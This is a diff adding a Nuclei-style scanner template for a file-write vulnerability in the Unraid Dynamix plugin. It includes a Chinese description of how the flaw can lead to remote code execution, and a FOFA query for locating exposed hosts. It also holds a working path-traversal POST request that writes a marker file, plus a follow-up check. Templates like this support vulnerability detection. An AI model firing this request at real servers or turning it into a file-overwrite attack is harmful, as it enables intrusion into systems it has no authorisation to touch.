@@ -1,0 +1,33 @@
+id: unraid-nas-dynamix-file-write
+
+info:
+  name: "Unraid Dynamix 插件文件写入漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: "/webGui/images/banner.png"
+      该漏洞源于目标系统中Dynamix插件的文件写入功能缺乏有效访问控制，攻击者可利用此缺陷在目标服务器文件系统中创建或覆盖任意路径的文件内容，进而可能导致远程代码执行或敏感数据泄露。
+  tags: Unraid,Dynamix
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /plugins/dynamix/include/SelectCase.php?file=../../../../usr/local/emhttp/NTest.txt HTTP/1.1
+    Host: {{Hostname}}
+
+    csrf_token=9855BE5478D13A31&mode=set&model=NdayTest
+- raw:
+  - |
+    GET /NTest.txt HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
